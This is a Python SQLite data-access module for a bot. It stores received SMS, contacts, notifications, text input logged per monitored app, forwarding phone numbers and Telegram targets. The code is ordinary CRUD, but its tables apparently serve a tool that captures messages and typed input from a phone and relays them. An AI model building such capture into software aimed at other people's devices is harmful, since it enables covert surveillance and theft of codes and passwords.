import sqlite3
import os
import logging
from datetime import datetime
from bot.config import DB_PATH, DB_ENCRYPTION_KEY

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────
# ENSURE DATA DIRECTORY EXISTS
# ─────────────────────────────────────────
_db_dir = os.path.dirname(DB_PATH)
if _db_dir:
    os.makedirs(_db_dir, exist_ok=True)


# ─────────────────────────────────────────
# DATABASE MANAGER CLASS
# ─────────────────────────────────────────
class DatabaseManager:
    def __init__(self):
        self.db_path = DB_PATH
        self.encryption_key = DB_ENCRYPTION_KEY
        self._initialize_database()

    # ─────────────────────────────────────────
    # CONNECTION
    # ─────────────────────────────────────────
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn

    # ─────────────────────────────────────────
    # INITIALIZE DATABASE
    # ─────────────────────────────────────────
    def _initialize_database(self):
        schema_path = os.path.join(os.path.dirname(__file__), "schema.sql")
        with open(schema_path, "r") as f:
            schema = f.read()
        with self.get_connection() as conn:
            conn.executescript(schema)
            conn.commit()
        logger.info("Database initialized successfully")

    # ─────────────────────────────────────────
    # SMS INBOX METHODS
    # ─────────────────────────────────────────
    def insert_sms(self, sms_id, sender, message, timestamp, is_priority=0):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR IGNORE INTO sms_inbox 
                    (sms_id, sender, message, timestamp, is_priority) 
                    VALUES (?, ?, ?, ?, ?)""",
                    (sms_id, sender, message, timestamp, is_priority)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Insert SMS error: {e}")
            return False

    def get_all_sms(self, limit=50):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    "SELECT * FROM sms_inbox ORDER BY timestamp DESC LIMIT ?",
                    (limit,)
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get SMS error: {e}")
            return []

    def get_sms_by_sender(self, sender):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    "SELECT * FROM sms_inbox WHERE sender=? ORDER BY timestamp DESC",
                    (sender,)
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get SMS by sender error: {e}")
            return []

    def delete_sms(self, sms_id):
        try:
            with self.get_connection() as conn:
                conn.execute("DELETE FROM sms_inbox WHERE sms_id=?", (sms_id,))
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Delete SMS error: {e}")
            return False

    def mark_sms_delivered(self, sms_id):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "UPDATE sms_inbox SET is_delivered=1 WHERE sms_id=?",
                    (sms_id,)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Mark SMS delivered error: {e}")
            return False

    def sms_exists(self, sms_id):
        try:
            with self.get_connection() as conn:
                row = conn.execute(
                    "SELECT id FROM sms_inbox WHERE sms_id=?", (sms_id,)
                ).fetchone()
            return row is not None
        except Exception as e:
            logger.error(f"SMS exists check error: {e}")
            return False

    # ─────────────────────────────────────────
    # SMS QUEUE METHODS
    # ─────────────────────────────────────────
    def add_to_sms_queue(self, sms_id, sender, message, timestamp, is_priority=0):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR IGNORE INTO sms_queue 
                    (sms_id, sender, message, timestamp, is_priority) 
                    VALUES (?, ?, ?, ?, ?)""",
                    (sms_id, sender, message, timestamp, is_priority)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add to SMS queue error: {e}")
            return False

    def get_sms_queue(self):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    """SELECT * FROM sms_queue 
                    WHERE retry_count < 3 
                    ORDER BY is_priority DESC, queued_at ASC"""
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get SMS queue error: {e}")
            return []

    def remove_from_sms_queue(self, sms_id):
        try:
            with self.get_connection() as conn:
                conn.execute("DELETE FROM sms_queue WHERE sms_id=?", (sms_id,))
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Remove from SMS queue error: {e}")
            return False

    def increment_sms_queue_retry(self, sms_id):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "UPDATE sms_queue SET retry_count=retry_count+1 WHERE sms_id=?",
                    (sms_id,)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Increment SMS queue retry error: {e}")
            return False

    def get_sms_queue_count(self):
        try:
            with self.get_connection() as conn:
                row = conn.execute("SELECT COUNT(*) as count FROM sms_queue").fetchone()
            return row["count"]
        except Exception as e:
            logger.error(f"Get SMS queue count error: {e}")
            return 0

    # ─────────────────────────────────────────
    # CONTACTS METHODS
    # ─────────────────────────────────────────
    def insert_contact(self, contact_id, name, number, email=""):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR REPLACE INTO contacts 
                    (contact_id, name, number, email) 
                    VALUES (?, ?, ?, ?)""",
                    (contact_id, name, number, email)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Insert contact error: {e}")
            return False

    def get_all_contacts(self):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    "SELECT * FROM contacts ORDER BY name ASC"
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get contacts error: {e}")
            return []

    def search_contact(self, query):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    """SELECT * FROM contacts 
                    WHERE name LIKE ? OR number LIKE ? 
                    ORDER BY name ASC""",
                    (f"%{query}%", f"%{query}%")
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Search contact error: {e}")
            return []

    # ─────────────────────────────────────────
    # INPUT VIEWER METHODS
    # ─────────────────────────────────────────
    def insert_viewer_log(self, app_name, input_text, timestamp):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT INTO viewer_log 
                    (app_name, input_text, timestamp) 
                    VALUES (?, ?, ?)""",
                    (app_name, input_text, timestamp)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Insert viewer log error: {e}")
            return False

    def get_viewer_logs(self, app_name=None, limit=50):
        try:
            with self.get_connection() as conn:
                if app_name:
                    rows = conn.execute(
                        """SELECT * FROM viewer_log 
                        WHERE app_name=? 
                        ORDER BY timestamp DESC LIMIT ?""",
                        (app_name, limit)
                    ).fetchall()
                else:
                    rows = conn.execute(
                        "SELECT * FROM viewer_log ORDER BY timestamp DESC LIMIT ?",
                        (limit,)
                    ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get viewer logs error: {e}")
            return []

    def add_to_viewer_queue(self, app_name, input_text, timestamp):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT INTO viewer_queue 
                    (app_name, input_text, timestamp) 
                    VALUES (?, ?, ?)""",
                    (app_name, input_text, timestamp)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add to viewer queue error: {e}")
            return False

    def get_viewer_queue(self):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    """SELECT * FROM viewer_queue 
                    WHERE retry_count < 3 
                    ORDER BY queued_at ASC"""
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get viewer queue error: {e}")
            return []

    def remove_from_viewer_queue(self, item_id):
        try:
            with self.get_connection() as conn:
                conn.execute("DELETE FROM viewer_queue WHERE id=?", (item_id,))
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Remove from viewer queue error: {e}")
            return False

    # ─────────────────────────────────────────
    # FOCUSED APPS METHODS
    # ─────────────────────────────────────────
    def add_focused_app(self, app_name, package_name):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR IGNORE INTO focused_apps 
                    (app_name, package_name) 
                    VALUES (?, ?)""",
                    (app_name, package_name)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add focused app error: {e}")
            return False

    def remove_focused_app(self, app_name):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "DELETE FROM focused_apps WHERE app_name=?", (app_name,)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Remove focused app error: {e}")
            return False

    def get_focused_apps(self):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    "SELECT * FROM focused_apps ORDER BY added_at ASC"
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get focused apps error: {e}")
            return []

    def is_app_focused(self, package_name):
        try:
            with self.get_connection() as conn:
                row = conn.execute(
                    "SELECT id FROM focused_apps WHERE package_name=?",
                    (package_name,)
                ).fetchone()
            return row is not None
        except Exception as e:
            logger.error(f"Is app focused check error: {e}")
            return False

    # ─────────────────────────────────────────
    # NOTIFICATIONS METHODS
    # ─────────────────────────────────────────
    def insert_notification(self, notif_id, app_name, title, content, timestamp):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR IGNORE INTO notifications 
                    (notif_id, app_name, title, content, timestamp) 
                    VALUES (?, ?, ?, ?, ?)""",
                    (notif_id, app_name, title, content, timestamp)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Insert notification error: {e}")
            return False

    def get_notifications(self, limit=50):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    "SELECT * FROM notifications ORDER BY timestamp DESC LIMIT ?",
                    (limit,)
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get notifications error: {e}")
            return []

    def add_to_notification_queue(self, notif_id, app_name, title, content, timestamp):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR IGNORE INTO notification_queue 
                    (notif_id, app_name, title, content, timestamp) 
                    VALUES (?, ?, ?, ?, ?)""",
                    (notif_id, app_name, title, content, timestamp)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add to notification queue error: {e}")
            return False

    def get_notification_queue(self):
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    """SELECT * FROM notification_queue 
                    WHERE retry_count < 3 
                    ORDER BY queued_at ASC"""
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get notification queue error: {e}")
            return []

    def remove_from_notification_queue(self, notif_id):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "DELETE FROM notification_queue WHERE notif_id=?", (notif_id,)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Remove from notification queue error: {e}")
            return False

    # ─────────────────────────────────────────
    # DELIVERY TRACKER METHODS
    # ─────────────────────────────────────────
    def track_delivery(self, item_id, item_type, status, attempts=0):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR REPLACE INTO delivery_tracker 
                    (item_id, item_type, status, attempts, last_attempt) 
                    VALUES (?, ?, ?, ?, ?)""",
                    (item_id, item_type, status, attempts, datetime.now().isoformat())
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Track delivery error: {e}")
            return False

    def get_delivery_stats(self):
        try:
            with self.get_connection() as conn:
                total = conn.execute("SELECT COUNT(*) as count FROM delivery_tracker").fetchone()["count"]
                delivered = conn.execute("SELECT COUNT(*) as count FROM delivery_tracker WHERE status='delivered'").fetchone()["count"]
                failed = conn.execute("SELECT COUNT(*) as count FROM delivery_tracker WHERE status='failed'").fetchone()["count"]
                pending = conn.execute("SELECT COUNT(*) as count FROM delivery_tracker WHERE status='pending'").fetchone()["count"]
            return {
                "total": total,
                "delivered": delivered,
                "failed": failed,
                "pending": pending
            }
        except Exception as e:
            logger.error(f"Get delivery stats error: {e}")
            return {"total": 0, "delivered": 0, "failed": 0, "pending": 0}

    # ─────────────────────────────────────────
    # SETTINGS METHODS
    # ─────────────────────────────────────────
    def get_setting(self, key, default=None):
        try:
            with self.get_connection() as conn:
                row = conn.execute(
                    "SELECT value FROM settings WHERE key=?", (key,)
                ).fetchone()
            return row["value"] if row else default
        except Exception as e:
            logger.error(f"Get setting error: {e}")
            return default

    def set_setting(self, key, value):
        try:
            with self.get_connection() as conn:
                conn.execute(
                    """INSERT OR REPLACE INTO settings (key, value, updated_at) 
                    VALUES (?, ?, ?)""",
                    (key, value, datetime.now().isoformat())
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Set setting error: {e}")
            return False

    # ─────────────────────────────────────────
    # QUEUE STATUS
    # ─────────────────────────────────────────
    def get_full_queue_status(self):
        try:
            sms_queue = self.get_sms_queue_count()
            with self.get_connection() as conn:
                viewer_queue = conn.execute("SELECT COUNT(*) as count FROM viewer_queue").fetchone()["count"]
                notif_queue = conn.execute("SELECT COUNT(*) as count FROM notification_queue").fetchone()["count"]
            return {
                "sms_queue": sms_queue,
                "viewer_queue": viewer_queue,
                "notification_queue": notif_queue,
                "total": sms_queue + viewer_queue + notif_queue
            }
        except Exception as e:
            logger.error(f"Get full queue status error: {e}")
            return {"sms_queue": 0, "viewer_queue": 0, "notification_queue": 0, "total": 0}


# ─────────────────────────────────────────
# SINGLETON INSTANCE
# ─────────────────────────────────────────
    # ─────────────────────────────────────────
    # FORWARD NUMBERS — MULTIPLE NUMBERS
    # ─────────────────────────────────────────
    def add_forward_number(self, number: str) -> bool:
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "INSERT OR IGNORE INTO forward_numbers (number) VALUES (?)",
                    (number,)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add forward number error: {e}")
            return False

    def get_forward_numbers(self) -> list:
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    "SELECT * FROM forward_numbers WHERE is_active = 1 ORDER BY created_at ASC"
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get forward numbers error: {e}")
            return []

    def update_forward_number(self, old_number: str, new_number: str) -> bool:
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "UPDATE forward_numbers SET number = ? WHERE number = ?",
                    (new_number, old_number)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Update forward number error: {e}")
            return False

    def delete_forward_number(self, number: str) -> bool:
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "DELETE FROM forward_numbers WHERE number = ?",
                    (number,)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Delete forward number error: {e}")
            return False

    def number_exists(self, number: str) -> bool:
        try:
            with self.get_connection() as conn:
                row = conn.execute(
                    "SELECT id FROM forward_numbers WHERE number = ?",
                    (number,)
                ).fetchone()
            return row is not None
        except Exception as e:
            logger.error(f"Number exists error: {e}")
            return False

    # ─────────────────────────────────────────
    # TELEGRAM TARGETS — MULTIPLE TARGETS
    # ─────────────────────────────────────────
    def add_telegram_target(self, target: str, target_type: str = "unknown") -> bool:
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "INSERT OR IGNORE INTO telegram_targets (target, target_type) VALUES (?, ?)",
                    (target, target_type)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Add telegram target error: {e}")
            return False

    def get_telegram_targets(self) -> list:
        try:
            with self.get_connection() as conn:
                rows = conn.execute(
                    "SELECT * FROM telegram_targets WHERE is_active = 1 ORDER BY created_at ASC"
                ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Get telegram targets error: {e}")
            return []

    def update_telegram_target(self, old_target: str, new_target: str, new_type: str) -> bool:
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "UPDATE telegram_targets SET target = ?, target_type = ? WHERE target = ?",
                    (new_target, new_type, old_target)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Update telegram target error: {e}")
            return False

    def delete_telegram_target(self, target: str) -> bool:
        try:
            with self.get_connection() as conn:
                conn.execute(
                    "DELETE FROM telegram_targets WHERE target = ?",
                    (target,)
                )
                conn.commit()
            return True
        except Exception as e:
            logger.error(f"Delete telegram target error: {e}")
            return False

    def telegram_target_exists(self, target: str) -> bool:
        try:
            with self.get_connection() as conn:
                row = conn.execute(
                    "SELECT id FROM telegram_targets WHERE target = ?",
                    (target,)
                ).fetchone()
            return row is not None
        except Exception as e:
            logger.error(f"Telegram target exists error: {e}")
            return False


db = DatabaseManager()
